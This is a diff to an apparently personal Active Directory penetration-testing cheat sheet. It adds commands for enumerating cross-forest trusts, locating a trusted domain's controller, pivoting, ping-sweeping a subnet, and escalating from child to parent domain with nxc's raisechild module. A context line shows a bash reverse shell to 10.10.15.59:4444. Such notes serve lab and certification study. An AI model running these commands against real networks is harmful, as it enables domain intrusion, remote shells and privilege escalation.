@@ -2535,6 +2535,16 @@ echo '/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.15.59/4444 0>&1"' > rev.sh
 ## Cross Forests :
 
 ```bash
+# Check if there are any trust between the domain we just compromised and another domain either via Bloodhound or :
+Get-ADTrust -Filter * | Select Name,Direction,TrustType,IntraForest
+
+# Once you find the name of that domain , try resolving the IP address of that Hostname :
+
+Resolve-DnsName -Type SRV _ldap._tcp.dc._msdcs.Corp2.Local
+nslookup -type=SRV _ldap._tcp.dc._msdcs.Corp2.Local 172.16.2.6
+
+# Try pinging that DC , if you can't setup a Ligolo Pivot on the DC that can reach it :) 
+
 # Do a ping sweep on Windows on a specific subdomain , Perferably from a DC . 
 From CMD : 
 (for /L %a IN (1,1,254) DO ping /n 1 /w 1 172.16.2.%a) | find "Reply"
@@ -2676,6 +2686,14 @@ Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 # Now we export it and do DCSYNC :
 
 ```
+
+**Automation** : 
+
+```bash
+# Or Just use Raise Child , nxc supports it as well now :
+
+nxc ldap <ip> -u <user> -p <pass> -M raisechild
+``` 
 
 ## Some Use cases :
 
